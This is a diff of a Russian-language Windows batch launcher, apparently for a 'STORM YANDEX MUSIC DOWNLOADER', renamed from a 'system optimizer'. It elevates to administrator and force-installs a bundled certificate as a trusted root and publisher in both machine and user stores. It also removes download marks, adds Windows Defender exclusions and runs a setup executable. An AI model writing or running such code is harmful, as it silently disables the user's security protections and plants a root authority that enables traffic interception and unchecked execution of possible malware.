@@ -1,6 +1,6 @@
 ﻿@echo off
 chcp 65001 >nul
-title STORM SYSTEM OPTIMIZER - Разблокировка Smart App Control и доверие сертификату
+title STORM YANDEX MUSIC DOWNLOADER - Разблокировка Smart App Control и доверие сертификату
 
 :: ============================================================
 :: 1. Проверка и автоматический запрос прав Администратора
@@ -13,7 +13,7 @@ if %errorLevel% neq 0 (
 )
 
 echo ============================================================
-echo   STORM SYSTEM OPTIMIZER v1.0.9 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM YANDEX MUSIC DOWNLOADER v1.0.1 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
@@ -25,10 +25,7 @@ if not exist "%CERT_FILE%" (
     set "CERT_FILE=%SCRIPT_DIR%STORM_Certificate.cer"
 )
 if not exist "%CERT_FILE%" (
-    set "CERT_FILE=%SCRIPT_DIR%Files\StormTeamRootCA.cer"
-)
-if not exist "%CERT_FILE%" (
-    set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"
+    set "CERT_FILE=%SCRIPT_DIR%installer\STORM_Certificate.cer"
 )
 
 :: ============================================================
@@ -55,7 +52,7 @@ if exist "%CERT_FILE%" (
     certutil.exe -addstore -f "CA" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "Root" "%CERT_FILE%" >nul 2>&1
     certutil.exe -user -addstore -f "TrustedPublisher" "%CERT_FILE%" >nul 2>&1
-    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('%CERT_FILE%'); foreach ($loc in @([System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine, [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) { foreach ($name in @([System.Security.Cryptography.X509Certificates.StoreName]::Root, [System.Security.Cryptography.X509Certificates.StoreName]::TrustedPublisher)) { try { $st = New-Object System.Security.Cryptography.X509Certificates.X509Store($name, $loc); $st.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite); $st.Add($c); $st.Close(); } catch {} } }" >nul 2>&1
+    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('%CERT_FILE%'); foreach ($loc in @([System.Security.Cryptography.X509Certificates.StoreLocation]::LocalMachine, [System.Security.Cryptography.X509Certificates.StoreLocation]::CurrentUser)) { foreach ($name in @([System.Security.Cryptography.X509Certificates.StoreName]::Root, [System.Security.Cryptography.X509Certificates.StoreName]::TrustedPublisher, [System.Security.Cryptography.X509Certificates.StoreName]::AuthRoot, [System.Security.Cryptography.X509Certificates.StoreName]::CertificateAuthority)) { try { $st = New-Object System.Security.Cryptography.X509Certificates.X509Store($name, $loc); $st.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite); $st.Add($c); $st.Close(); } catch {} } }" >nul 2>&1
     echo [OK] Сертификат STORM TEAM успешно добавлен в Доверенные корневые центры и Издатели!
 ) else (
     echo [!] Файл сертификата не найден: %CERT_FILE%
@@ -74,26 +71,26 @@ echo [OK] Все файлы в директории успешно разбло�
 :: ============================================================
 echo.
 echo [4/5] Добавление папки программы в исключения Защитника Windows...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM YANDEX MUSIC DOWNLOADER' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM YANDEX MUSIC DOWNLOADER.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 echo [OK] Исключения в Защитник Windows успешно добавлены!
 
 :: ============================================================
 :: 6. Запуск программы / Установщика
 :: ============================================================
 echo.
-echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.9...
+echo [5/5] Запуск STORM YANDEX MUSIC DOWNLOADER v1.0.1...
 echo.
 echo ============================================================
 echo   ГОТОВО! Все ограничения успешно сняты.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe" (
-    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe"
-) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
-    start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
-) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.9_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM YANDEX MUSIC DOWNLOADER\installer\Output\STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM YANDEX MUSIC DOWNLOADER\installer\Output\STORM_YANDEX_MUSIC_DOWNLOADER_1.0.1_Setup.exe"
 )
 
 timeout /t 3 >nul
